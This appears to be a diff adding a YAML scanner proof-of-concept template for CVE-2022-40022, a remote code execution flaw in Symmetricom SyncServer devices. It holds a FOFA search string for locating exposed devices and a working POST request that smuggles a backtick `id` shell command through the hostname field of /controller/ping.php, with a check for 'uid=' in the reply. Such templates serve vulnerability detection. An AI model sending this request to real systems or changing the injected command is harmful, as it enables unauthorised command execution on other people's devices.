@@ -1,0 +1,27 @@
+id: poc-yaml-symmetricom-syncserver-rce
+info:
+  name: Symmetricom SyncServer 远程代码执行漏洞(CVE-2022-40022)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2022-40022
+  finger: syncserver_s650
+  fofa: html:"Symmetricom SyncServer"
+requests:
+- method: POST
+  path: /controller/ping.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: currentTab=ping&refreshMode=&ethDirty=false&snmpCfgDirty=false&snmpTrapDirty=false&pingDirty=false&hostname=%60id%60&port=eth0&pingType=ping
+  expression: 'status_code == 302
+
+    && contains(body,"uid=")
+
+    && contains(body,"Symmetricom SyncServer")
+
+    && contains(body,"unknown host")
+
+    '
+variables: {}
+transport: http
